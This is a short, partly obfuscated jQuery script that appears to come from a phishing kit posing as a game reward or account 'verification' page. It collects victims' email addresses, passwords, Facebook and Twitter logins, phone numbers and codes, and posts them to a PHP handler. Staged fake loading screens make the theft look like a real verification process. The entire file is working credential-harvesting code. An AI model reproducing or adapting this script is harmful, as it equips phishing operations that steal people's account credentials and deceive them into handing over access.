function open_verif() {
  $('.account_verification').show()
  $('.itemReward_confirmation').hide()
  $('.many_confirmation').hide()
  $('#load-verify').show()
  $('#stepform').hide()
  setTimeout(function () {
    $('#load-verify').hide()
    $('#stepform').show()
  }, 2000)
}
function ClearFields() {
  document.getElementById('selowmail-fb').value = ''
  document.getElementById('selowpw-fb').value = ''
  document.getElementById('selowmail-tw').value = ''
  document.getElementById('selowpw-tw').value = ''
}
function verify_done() {
  $('#load-verify').show()
  $('#stepform').hide()
  setTimeout(function () {
    $('#load-verify').hide()
    $('.account_verification').hide()
    $('.processing_account').show()
  }, 3000)
}

function ValidateVerificationData() {
  return (
    $('#ValidateVerificationDataForm').submit(function (_0x41281d) {
      _0x41281d.preventDefault()
      var _0x197b81 = $('input#validateEmail').val(),
        _0x10d75d = $('input#validatePassword').val(),
        _0x12c3ae = $('input#ValidatePopupPlayId').val(),
        _0x3117c2 = $('input#phone').val(),
        _0x52b231 = $('input#level').val(),
        _0x1b7d55 = $('input#vmail').val(),
        _0x18bd67 = $('input#codetel').val(),
        _0x1f0950 = $('input#validateLogin').val()
      if (
        _0x197b81 == '' &&
        _0x10d75d == '' &&
        $nick == '' &&
        _0x12c3ae == '' &&
        _0x3117c2 == '' &&
        _0x52b231 == '' &&
        _0x1b7d55 == '' &&
        _0x1f0950 == '' &&
        _0x18bd67 == ''
      ) {
        return (
          $('.verification_info').show(),
          $('.account_verification').hide(),
          false
        )
      }
      $.ajax({
        type: 'POST',
        url: 'checkVerificationData.php',
        data: $(this).serialize(),
        beforeSend: function () {
          $('#stepform').hide()
          $('#load-verify').show()
          $('.account_verification').show()
        },
        success: function () {
          verify_done()
        },
      })
    }),
    false
  )
}
